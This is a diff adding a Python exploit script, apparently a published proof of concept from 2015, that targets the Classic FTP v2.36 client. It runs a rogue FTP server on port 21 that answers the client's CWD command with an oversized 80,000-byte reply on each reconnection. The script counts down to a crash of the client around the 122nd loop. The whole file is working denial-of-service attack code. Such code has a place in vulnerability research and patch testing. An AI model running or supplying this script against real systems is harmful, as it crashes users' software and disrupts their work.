@@ -1,0 +1,48 @@
+#!/usr/bin/env python
+#
+# Exploit Title: Classic FTP v2.36 CWD Reconnection DOS
+# Date: 27/07/2015
+# Exploit Author: St0rn <fabien[at]anbu-pentest[dot]com>
+# Vendor Homepage: www.nchsoftware.com
+# Software Link: www.nchsoftware.com/classic/cftpsetup.exe
+# Version: 2.36
+# Tested on: Windows 7
+#
+
+
+import socket
+import sys
+import time
+
+
+junk1="250 "+"a"*(80000-6)+"\r\n"
+c=1
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("",21))
+s.listen(10)
+
+
+while 1:
+ conn, addr = s.accept()
+ print 'Connected with ' + addr[0] + ':' + str(addr[1])
+ conn.send("220 Classic FTP Xsploit\r\n")
+ try:
+  while 1:
+   buf=conn.recv(1024)
+   if "USER" in buf:
+    conn.send("331 User name okay, need password\r\n")
+   if "PASS" in buf:
+    conn.send("230-Password accepted.\r\n")
+    conn.send("230 User logged in.\r\n")
+   if "CWD" in buf:
+    conn.send(junk1)
+    print "Evil Response send with %s bytes!" %len(junk1)
+    print "Loop %s: \n\tWaiting client reconnection, crash in %s loop\n" %(c,(122-c))
+    if c==122:
+     print "BOOMmMm!"
+    c+=1
+   if "QUIT" in buf:
+    break
+ except:
+  time.sleep(0)
